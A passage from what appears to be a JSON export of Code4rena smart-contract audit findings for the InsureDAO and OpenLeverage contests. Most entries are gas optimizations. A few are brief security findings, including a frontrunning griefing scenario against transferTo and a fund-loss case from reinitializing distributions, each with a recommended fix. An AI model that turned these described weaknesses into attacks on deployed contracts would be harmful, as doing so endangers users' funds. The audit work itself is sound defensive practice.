from `calldata` using `calldataload` instead of going via `memory` saves the gas from the intermediate memory operations that carry the values.      As an extract from https://ethereum.stackexchange.com/questions/74442/when-should-i-use-calldata-and-when-should-i-use-memory :   > `memory` and `calldata` (as well as `storage`) are keywords that define the data area where a variable is stored. To answer your question directly, `memory` should be used when declaring variables (both function parameters as well as inside the logic of a function) that you want stored in memory (temporary), and `calldata` _must_ be used when declaring an **external** function's **dynamic** parameters. The easiest way to think about the difference is that `calldata` is a non-modifiable, non-persistent area where function arguments are stored, and behaves mostly like memory.      ## Proof of Concept   ``` arbitrum-lpt-bridge\\contracts\\L1\\gateway\\L1Migrator.sol:159:        bytes memory _sig, arbitrum-lpt-bridge\\contracts\\L1\\gateway\\L1Migrator.sol:209:        bytes memory _sig, arbitrum-lpt-bridge\\contracts\\L1\\gateway\\L1Migrator.sol:262:        bytes memory _sig, arbitrum-lpt-bridge\\contracts\\L2\\gateway\\L2Migrator.sol:130:    function finalizeMigrateDelegator(MigrateDelegatorParams memory _params) arbitrum-lpt-bridge\\contracts\\L2\\gateway\\L2Migrator.sol:195:        MigrateUnbondingLocksParams memory _params arbitrum-lpt-bridge\\contracts\\L2\\gateway\\L2Migrator.sol:215:    function finalizeMigrateSender(MigrateSenderParams memory _params) ```     ## Tools Used   VS Code      ## Recommended Mitigation Steps   Use `calldata` instead of `memory` for external functions where the function argument is read-only.   "}, {"title": "Gas: Unused Named Returns", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/63", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   Using both named returns and a return statement isn't necessary. Removing unused named return variables can reduce gas usage and improve code clarity. To save gas and improve code quality: consider using only one of those.      ## Proof of Concept   Instances include:   ``` ConvexStakingWrapper.sol:310:    function earned(address _account) external view returns (EarnedData[] memory claimable) { //@audit-info 342: return claimable;  Cvx3CrvOracle.sol:76:        returns (uint256 quoteAmount, uint256 updateTime) //@audit-info 78: return _peek(base.b6(), quote.b6(), baseAmount);  Cvx3CrvOracle.sol:97:        returns (uint256 quoteAmount, uint256 updateTime) //@audit-info 99: return _peek(base.b6(), quote.b6(), baseAmount); ```     ## Tools Used   VS Code      ## Recommended Mitigation Steps   Remove the unused named returns   "}, {"title": "Gas: Usage of a non-native 256 bits uint as a counter in for-loops increases gas cost", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/62", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   Due to how the EVM natively works on 256 bit numbers, using a 8 bit number in for-loops introduces additional costs as the EVM has to properly enforce the limits of this smaller type.  See the warning at this link: https://docs.soliditylang.org/en/v0.8.0/internals/layout_in_storage.html#layout-of-state-variables-in-storage : > When using elements that are smaller than 32 bytes, your contract\u2019s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size. > It is only beneficial to use reduced-size arguments if you are dealing with storage values because the compiler will pack multiple elements into one storage slot, and thus, combine multiple reads or writes into a single operation. When dealing with function arguments or memory values, there is no inherent benefit because the compiler does not pack these values.    ## Proof of Concept   ``` Vault.sol:109:        for (uint128 i = 0; i < 2; i++) { ```  ## Tools Used   VS Code      ## Recommended Mitigation Steps   Use `uint256` as a counter in for-loops.   "}, {"title": "Gas optimization in PoolTemplate.withdraw()", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/59", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  tqts   # Vulnerability details  ## Impact None  ## Proof of Concept The `withdrawalReq[msg.sender].timestamp` and `parameters.getLockup(msg.sender)` values are used twice in the `require` statements, and both times summed.   ## Tools Used Manual review  ## Recommended Mitigation Steps Cache the sum value in a new variable. I've sent a similar report for IndexTemplate.withdraw() with a similar issue.  "}, {"title": "Gas optimization in IndexTemplate._adjustAlloc()", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/58", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2022-01-insure-findings", "body": "Gas optimization in IndexTemplate._adjustAlloc()"}, {"title": "Gas optimization in IndexTemplate.requestWithdraw()", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/56", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  tqts   # Vulnerability details  ## Impact None  ## Proof of Concept In [L197](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L197) of IndexTemplate, a `_balance` variable is created and initialized to the balance of `msg.sender`. However that variable is used only once in the function.  ## Tools Used Manual review  ## Recommended Mitigation Steps Replace L198 with `require(balanceOf(msg.sender) >= _amount, \"ERROR: REQUEST_EXCEED_BALANCE\");` and remove L197  "}, {"title": "_depositFrom() does not  ensure that _from arg is not the contract itself ", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/51", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2022-01-insure-findings", "body": "_depositFrom() does not  ensure that _from arg is not the contract itself "}, {"title": "pool can't be initialized", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/48", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2022-01-insure-findings", "body": "pool can't be initialized"}, {"title": "Update to solc-0.8.10+", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/47", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact Gas costs  ## Proof of Concept  Solidity 0.8.10 has a useful change which reduced gas costs of external calls which expect a return value: https://blog.soliditylang.org/2021/11/09/solidity-0.8.10-release-announcement/  > Code Generator: Skip existence check for external contract if return data is expected. In this case, the ABI decoder will revert if the contract does not exist  InsureDAO is using 0.8.7:  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Factory.sol#L8  Updating to the newer version of solc will allow InsureDAO to take advantage of these lower costs for external calls.  ## Recommended Mitigation Steps  Update to solc 0.8.10 or above  "}, {"title": "Parameters.sol lacks input validation", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/44", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  cccz   # Vulnerability details  ## Impact When setting parameters in the Parameters contract, the input parameters are not verified.  For example, in the setFeeRate function, the _target parameter is not limited. When _target is greater than 1e6, DOS will occur when used in the insure function of the PoolTemplate contract ```     function setFeeRate(address _address, uint256 _target)         external         override         onlyOwner     {         _fee[_address] = _target;         emit FeeRateSet(_address, _target);     }    ...    function insure(         uint256 _amount,         uint256 _maxCost,         uint256 _span,         bytes32 _target     ) external returns (uint256) {         //Distribute premium and fee         uint256 _endTime = _span + block.timestamp;         uint256 _premium = getPremium(_amount, _span);         uint256 _fee = parameters.getFeeRate(msg.sender);          require(             _amount <= availableBalance(),             \"ERROR: INSURE_EXCEEDED_AVAILABLE_BALANCE\"         );         require(_premium <= _maxCost, \"ERROR: INSURE_EXCEEDED_MAX_COST\");         require(_span <= 365 days, \"ERROR: INSURE_EXCEEDED_MAX_SPAN\");         require(             parameters.getMinDate(msg.sender) <= _span,             \"ERROR: INSURE_SPAN_BELOW_MIN\"         );          require(             marketStatus == MarketStatus.Trading,             \"ERROR: INSURE_MARKET_PENDING\"         );         require(paused == false, \"ERROR: INSURE_MARKET_PAUSED\");          //current liquidity         uint256 _liquidity = totalLiquidity();         uint256 _totalCredit = totalCredit;          //accrue premium/fee         uint256[2] memory _newAttribution = vault.addValueBatch(             _premium,             msg.sender,             [address(this), parameters.getOwner()],             [MAGIC_SCALE_1E6-_fee, _fee]         ); ``` ## Proof of Concept  https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Parameters.sol  ## Tools Used  Manual analysis   ## Recommended Mitigation Steps  When setting parameters in the Parameters contract, verify the input parameters  "}, {"title": "Gas: An array's length should be cached to save gas in for-loops", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/43", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   Reading array length at each iteration of the loop takes 6 gas (3 for mload and 3 to place memory_offset) in the stack.      Caching the array length in the stack saves around 3 gas per iteration.      ## Proof of Concept   ```   Factory.sol:176:            for (uint256 i = 0; i < _references.length; i++) { Factory.sol:186:            for (uint256 i = 0; i < _conditions.length; i++) { IndexTemplate.sol:655:        for (uint256 i = 0; i < poolList.length; i++) { PoolTemplate.sol:343:        for (uint256 i = 0; i < _ids.length; i++) { PoolTemplate.sol:671:        for (uint256 i = 0; i < indexList.length; i++) { PoolTemplate.sol:703:        for (uint256 i = 0; i < indexList.length; i++) { ```   ## Tools Used   VS Code      ## Recommended Mitigation Steps   Store the array's length in a variable before the for-loop, and use it instead.   "}, {"title": "Redundant if statements in market deployment function", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/41", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact gas costs  ## Proof of Concept  Here if the lengths of these arrays are zero we'll fall straight through the for loops so there's no need for the if statements.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Factory.sol#L175-L191  ## Recommended Mitigation Steps  Remove if statements  "}, {"title": "Gas: No need to initialize variables with default values", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/40", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   If a variable is not set/initialized, it is assumed to have the default value (0, false, 0x0 etc depending on the data type). Explicitly initializing it with its default value is an anti-pattern and wastes gas.    ## Proof of Concept   Instances include:   ``` Timeswap-V1-Convenience\\contracts\\libraries\\NFTTokenURIScaffold.sol:119:        for(uint i = 0; i < lengthDiff; i++) { Timeswap-V1-Convenience\\contracts\\libraries\\NFTTokenURIScaffold.sol:147:        for(uint i = 0; i < lengthDiff; i++) { Timeswap-V1-Convenience\\contracts\\libraries\\NFTTokenURIScaffold.sol:201:        for (uint256 i = 0; i < data.length; i++) { ```     ## Tools Used   Manual Analysis      ## Recommended Mitigation Steps   Remove explicit initialization for default values.   "}, {"title": "Redundant tracking of markets in factory", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/39", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact  Gas costs  ## Proof of Concept  Here we push a new market onto an array in the factory whilst we just added the market to the registry.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Factory.sol#L214-L216  ## Recommended Mitigation Steps  This array on the factory seems redundant and so it can be removed.  "}, {"title": "Gas: SafeMath is not needed when using Solidity version 0.8.*", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/38", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   Increased gas cost      ## Proof of Concept   Solidity version 0.8.* already implements overflow and underflow checks by default.  Using the SafeMath library from OpenZeppelin (which is more gas expensive than the 0.8.* overflow checks) is therefore redundant.      Instances include:  ```   mocks\\ERC20.sol:4:import \"@openzeppelin/contracts/utils/math/SafeMath.sol\"; mocks\\ERC20.sol:30:    using SafeMath for uint256; mocks\\TestPremiumModel.sol:3:import \"@openzeppelin/contracts/utils/math/SafeMath.sol\"; mocks\\TestPremiumModel.sol:7:    using SafeMath for uint256; PremiumModels\\BondingPremium.sol:10:import \"@openzeppelin/contracts/utils/math/SafeMath.sol\"; ```      ## Tools Used   VS Code      ## Recommended Mitigation Steps   Use the built-in checks instead of SafeMath and remove SafeMath from the dependencies   "}, {"title": "allocatedCredit and availableBalance are always read together so should be returned together.", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/37", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact  Gas costs  ## Proof of Concept  It seems that we always want to get a pool's `allocatedCredit` and `availableBalance` together, suggesting that these values are tightly coupled.   https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L284-L287  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L356-L360  If we're regularly going to be requesting these values together it may be worth considering having a single function in the pool template which returns both of these values. This would save gas costs of performing an extra external call to the pool contract.  ## Recommended Mitigation Steps  Consider having a function which returns both of these values to avoid repeated calls into the same contract for related info.  "}, {"title": "Gas: `> 0` is less efficient than `!= 0` for unsigned integers", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/36", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   `!= 0` costs less gas compared to `> 0` for unsigned integer      ## Proof of Concept   `> 0` is used in the following location(s): ```   CDSTemplate.sol:100:                bytes(_metaData).length > 0 && CDSTemplate.sol:132:        require(_amount > 0, \"ERROR: DEPOSIT_ZERO\"); CDSTemplate.sol:140:        if (_supply > 0 && _liquidity > 0) { CDSTemplate.sol:142:        } else if (_supply > 0 && _liquidity == 0) { CDSTemplate.sol:191:        require(_amount > 0, \"ERROR: REQUEST_ZERO\"); CDSTemplate.sol:223:        require(_amount > 0, \"ERROR: WITHDRAWAL_ZERO\"); CDSTemplate.sol:296:        if (totalSupply() > 0) { Factory.sol:175:        if (_references.length > 0) { Factory.sol:185:        if (_conditions.length > 0) { Factory.sol:187:                if (conditionlist[address(_template)][i] > 0) { IndexTemplate.sol:133:                bytes(_metaData).length > 0 && IndexTemplate.sol:166:        require(_amount > 0, \"ERROR: DEPOSIT_ZERO\"); IndexTemplate.sol:172:        if (_supply > 0 && _totalLiquidity > 0) { IndexTemplate.sol:174:        } else if (_supply > 0 && _totalLiquidity == 0) { IndexTemplate.sol:199:        require(_amount > 0, \"ERROR: REQUEST_ZERO\"); IndexTemplate.sol:231:        require(_amount > 0, \"ERROR: WITHDRAWAL_ZERO\"); IndexTemplate.sol:246:        if (_liquidityAfter > 0) { IndexTemplate.sol:274:        if(_totalLiquidity > 0){ IndexTemplate.sol:283:                if (_allocPoint > 0) { IndexTemplate.sol:391:                if (_current > _target && _available != 0) { IndexTemplate.sol:427:            allocPoints[msg.sender] > 0, IndexTemplate.sol:477:        require(allocPoints[msg.sender] > 0); IndexTemplate.sol:493:        if (totalLiquidity() > 0) { IndexTemplate.sol:513:        if (totalSupply() > 0) { IndexTemplate.sol:612:        if (totalAllocPoint > 0) { IndexTemplate.sol:656:            if (allocPoints[poolList[i]] > 0) { InsureDAOERC20.sol:302:        require(accountBalance >= amount, \"ERC20: burn amount exceeds balance\"); Parameters.sol:31:    mapping(address => uint256) private _fee; //fee rate in 1e6 (100% = 1e6) PoolTemplate.sol:185:                bytes(_metaData).length > 0 && PoolTemplate.sol:218:        if (_conditions[1] > 0) { PoolTemplate.sol:237:        require(_amount > 0, \"ERROR: DEPOSIT_ZERO\"); PoolTemplate.sol:263:        require(_amount > 0, \"ERROR: DEPOSIT_ZERO\"); PoolTemplate.sol:282:        require(_amount > 0, \"ERROR: REQUEST_ZERO\"); PoolTemplate.sol:321:        require(_amount > 0, \"ERROR: WITHDRAWAL_ZERO\"); PoolTemplate.sol:391:        } else if (_index.credit > 0) { PoolTemplate.sol:396:            if (_pending > 0) { PoolTemplate.sol:401:        if (_credit > 0) { PoolTemplate.sol:437:        if (_credit > 0) { PoolTemplate.sol:444:        if (_pending > 0) { PoolTemplate.sol:521:        if (_totalCredit > 0) { PoolTemplate.sol:672:            if (indicies[indexList[i]].credit > 0) { PoolTemplate.sol:706:            if (_credit > 0) { PoolTemplate.sol:726:        if (_deductionFromPool > 0) { PoolTemplate.sol:745:        if (totalSupply() > 0) { PoolTemplate.sol:802:        if (_supply > 0 && _originalLiquidity > 0) { PoolTemplate.sol:804:        } else if (_supply > 0 && _originalLiquidity == 0) { PoolTemplate.sol:835:        if (totalLiquidity() > 0) { PoolTemplate.sol:847:        if (lockedAmount > 0) { PoolTemplate.sol:929:        require(b > 0); Vault.sol:154:            attributions[msg.sender] > 0 && Vault.sol:187:            attributions[msg.sender] > 0 && Vault.sol:220:            attributions[msg.sender] > 0 && Vault.sol:347:        if (_amount > 0) { Vault.sol:388:        if (totalAttributions > 0 && _attribution > 0) { Vault.sol:406:        if (attributions[_target] > 0) { Vault.sol:473:        } else if (IERC20(_token).balanceOf(address(this)) > 0) { ```      ## Tools Used   VS Code      ## Recommended Mitigation Steps   Change `> 0` with `!= 0`.   "}, {"title": "Unnecessary market status check on redemption", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/32", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact  gas costs  ## Proof of Concept  Here on L563 we check the market status however we have already done this on L558  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L557-L567  ## Recommended Mitigation Steps  Remove redundant check (check other market templates as well)  "}, {"title": "Skip balance check in _beforeTokenTransfer if no withdrawalRequest exists", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/31", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact  Gas costs  ## Proof of Concept  When transferring any of the market tokens, a check is performed to see if they have a pending withdrawal and reduce it if their balance falls below the requested amount.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PoolTemplate.sol#L910-L923  In the case where a user has no pending withdrawal we then perform an unnecessary check on their balance. We could save an SLOAD by changing it to the below  ``` if (from != address(0)) {     uint256 reqAmount = withdrawalReq[from].amount     if (reqAmount > 0){         uint256 _after = balanceOf(from) - amount;         if (_after < reqAmount) {             withdrawalReq[from].amount = _after;         }     }  } ```  ## Recommended Mitigation Steps  As above  "}, {"title": "Gas: Consider making some constants as non-public to save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/30", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact   Reducing from public to private will save gas    ## Proof of Concept   ``` arbitrum-lpt-bridge\\contracts\\L1\\gateway\\L1Migrator.sol:111:    bytes32 public constant GOVERNOR_ROLE = keccak256(\"GOVERNOR_ROLE\"); arbitrum-lpt-bridge\\contracts\\L2\\gateway\\L2Migrator.sol:59:    bytes32 public constant GOVERNOR_ROLE = keccak256(\"GOVERNOR_ROLE\"); arbitrum-lpt-bridge\\contracts\\L2\\token\\LivepeerToken.sol:9:    bytes32 public constant MINTER_ROLE = keccak256(\"MINTER_ROLE\"); arbitrum-lpt-bridge\\contracts\\L2\\token\\LivepeerToken.sol:10:    bytes32 public constant BURNER_ROLE = keccak256(\"BURNER_ROLE\"); arbitrum-lpt-bridge\\contracts\\ControlledGateway.sol:13:    bytes32 public constant GOVERNOR_ROLE = keccak256(\"GOVERNOR_ROLE\"); ```  ## Tools Used   VS Code      ## Recommended Mitigation Steps   Theses constants can simply be read from the verified contract, i.e., it is unnecessary to expose them with a public function.  "}, {"title": "Withdrawal struct can be packed to save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/27", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact Detailed description of the impact of this finding.  ## Proof of Concept  The `Withdrawal` struct in `IndexTemplate.sol` contains a timestamp and the amount of tokens which the user requests to withdraw.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L81-L84  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L198  If we make the safe assumption that the user's balance does not exceed 2^192 then we can pack this struct into a single storage slot to save an SLOAD by changing the definition to:  ``` struct Withdrawal {     uint64 timestamp;     uint192 amount; } ```  ## Recommended Mitigation Steps  As above  "}, {"title": "sqrt can be made unchecked to save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/26", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact  gas costs  ## Proof of Concept  In the sqrt function it is known that the while loop will not overflow so it can be safely left unchecked to save gas.  https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PremiumModels/BondingPremium.sol#L238-L245  ```     function sqrt(uint256 x) internal pure returns (uint256 y) {         uint256 z = (x + 1) / 2;         unchecked {             y = x;             while (z < y) {                 y = z;                 z = (x / z + z) / 2;             }         }     } ``` ## Recommended Mitigation Steps  wrap entire function body in a unchecked block as above  "}, {"title": "Never used parameters", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/22", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2022-01-insure-findings", "body": "Never used parameters"}, {"title": "Assert instead require to validate user inputs", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/21", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  robee   # Vulnerability details  From solidity docs: Properly functioning code should never reach a failing assert statement; if this happens there is a bug in your contract which you should fix. With assert the user pays the gas and with require it doesn't. The ETH network gas isn't cheap and users can see it as a scam.  You have reachable asserts in the following locations (which should be replaced by require / are mistakenly left from development phase):          XDEFIDistribution.sol : reachable assert in line 284         XDEFIDistribution.sol : reachable assert in line 288  "}, {"title": "Two Steps Verification before Transferring Ownership", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/20", "labels": ["bug", "1 (Low Risk)", "sponsor disputed"], "target": "2022-01-insure-findings", "body": "Two Steps Verification before Transferring Ownership"}, {"title": "Named return issue", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/18", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "Named return issue"}, {"title": "Require with empty message", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/15", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "Require with empty message"}, {"title": "Check if amount is not zero to save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/13", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  robee   # Vulnerability details  The following functions could skip other steps if the amount is 0. (A similar issue: https://github.com/code-423n4/2021-10-badgerdao-findings/issues/82)           InsureDAOERC20.sol, name         InsureDAOERC20.sol, symbol         InsureDAOERC20.sol, decimals         InsureDAOERC20.sol, totalSupply         InsureDAOERC20.sol, balanceOf         InsureDAOERC20.sol, transfer         InsureDAOERC20.sol, allowance         InsureDAOERC20.sol, approve         InsureDAOERC20.sol, transferFrom         InsureDAOERC20.sol, increaseAllowance         InsureDAOERC20.sol, decreaseAllowance         InsureDAOERC20.sol, _transfer         InsureDAOERC20.sol, _mint         InsureDAOERC20.sol, _burn         InsureDAOERC20.sol, _approve         InsureDAOERC20.sol, _beforeTokenTransfer         InsureDAOERC20.sol, _afterTokenTransfer  "}, {"title": "Public functions to external", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/7", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "Public functions to external"}, {"title": "Storage double reading. Could save SLOAD", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/5", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "Storage double reading. Could save SLOAD"}, {"title": "Unused state variables", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/3", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "Unused state variables"}, {"title": "Unused imports", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/1", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "Unused imports"}, {"title": "Multiple potential reentrancies", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/270", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Multiple potential reentrancies"}, {"title": "Anyone can crash transferTo", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/261", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact function transferTo allows transferring amount from beneficiary to any address. However, 'to' is considered valid when it does not have an amount locked yet: ```solidity  function transferTo(address to, uint amount) external  ...    require(releaseVars[to].amount == 0, 'to is exist');  ``` It locks this amount for releaseVars[beneficiary].endTime. Because the blockchain is public, a malicious actor could monitor the mempool, and crash any attempt of transferTo by frontrunning it and calling transferTo with the smallest fraction (dust) from his own address to the 'to' address, making it unavailable to receive new locks for some time (even 4 years is possible?).  ## Recommended Mitigation Steps A few possible solutions would be to introduce a reasonable minimum amount to transfer or add a 2-step approval, where 'to' first have to approve the beneficiary.  "}, {"title": "Optimize `OpenLevV1.sol#addMarket`", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/250", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Optimize `OpenLevV1.sol#addMarket`"}, {"title": "Timelock.sol modification removes logic checks", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/247", "labels": ["bug", "0 (Non-critical)"], "target": "2022-01-openleverage-findings", "body": "Timelock.sol modification removes logic checks"}, {"title": "Gas Optimization: Redundant check", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/236", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Gas Optimization: Redundant check"}, {"title": "anti-flashloan mechanism may lead to protocol default", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/233", "labels": ["bug", "2 (Med Risk)"], "target": "2022-01-openleverage-findings", "body": "anti-flashloan mechanism may lead to protocol default"}, {"title": "transfer() may break in future ETH upgrade", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/228", "labels": ["bug", "1 (Low Risk)", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  gzeon   # Vulnerability details  ## Impact `transfer()` only forward 2300 gas which may break when gas cost change in a future ETH upgrade see: https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/  ## Proof of Concept https://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/OpenLevV1Lib.sol#L253 ```             payable(to).transfer(amount); ```  ## Recommended Mitigation Steps use call() instead  "}, {"title": "Gas Optimization: No need to use SafeMath everywhere", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/225", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Gas Optimization: No need to use SafeMath everywhere"}, {"title": "Funds can be lost", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/220", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-openleverage-findings", "body": "# Handle  csanuragjain   # Vulnerability details  ## Impact User funds can be lost if Admin sets startTimes[i] to 0  ## Proof of Concept  1. Navigate to contract https://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/farming/FarmingPools.sol  2. Check the initDistributions function  ``` function initDistributions(address[] memory stakeTokens, uint64[] memory startTimes, uint64[] memory durations) external onlyAdmin {         for (uint256 i = 0; i < stakeTokens.length; i++) {             require(distributions[stakeTokens[i]].starttime == 0, 'Init once');             distributions[stakeTokens[i]] = Distribution(durations[i], startTimes[i], 0, 0, 0, 0, 0);         }     } ```  3. Assume Admin calls this for token X with startTimes[i] as 0. This creates a new distribution with start time as 0 for token X  4. User Y stakes amount 500 for this token X  5. Admin calls initDistributions again with token X and startTimes[i] as 1000. This overwrites and reinitializes distributions[X] which means totalStaked becomes 0 and contract has lost all track of user funds now  ## Recommended Mitigation Steps Add a check to see startTimes[i]!=0 in initDistributions function  "}, {"title": "Last reward is discarded when reward added twice", "html_url": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/218", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-openleverage-findings", "body": "Last reward is discarded when reward added twice"}, 